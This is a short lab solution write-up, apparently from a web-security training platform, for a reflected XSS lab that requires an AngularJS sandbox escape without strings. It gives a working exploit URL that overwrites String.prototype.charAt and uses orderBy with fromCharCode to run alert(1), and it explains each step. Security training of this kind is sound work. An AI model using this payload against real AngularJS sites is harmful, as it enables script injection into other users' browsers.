# Lab 12: Reflected XSS with AngularJS sandbox escape without strings

This lab uses **AngularJS** in an unusual way where the `$eval` function is **not available**, and you **cannot use any strings** in AngularJS expressions.

---

## ❗ Lab Challenge

Perform a cross-site scripting attack that **escapes the AngularJS sandbox** and executes the `alert()` function **without using the `$eval` function** or any strings.

---

## 🔧 Solution

Visit the following URL, replacing `YOUR-LAB-ID` with your actual lab ID:

```html
https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1

```

---

## 💡 Explanation

- The exploit uses `toString()` to **create strings without quotes**.
- It accesses the **String prototype** and **overwrites the `charAt` function** for every string.
- This effectively **breaks the AngularJS sandbox**.
- An array `[1]` is passed to the `orderBy` filter.
- The argument to the filter is created by:
    - Using `toString()` and the String constructor property.
    - Using the `fromCharCode` method to generate the string payload: `x=alert(1)`.
- Because `charAt` is overwritten, AngularJS **allows this code execution**, where normally it would not.

---

## ▶️ Community Video Solution

> Watch the detailed walkthrough here:
[https://youtu.be/pln9RRbB5CI](https://youtu.be/pln9RRbB5CI)
>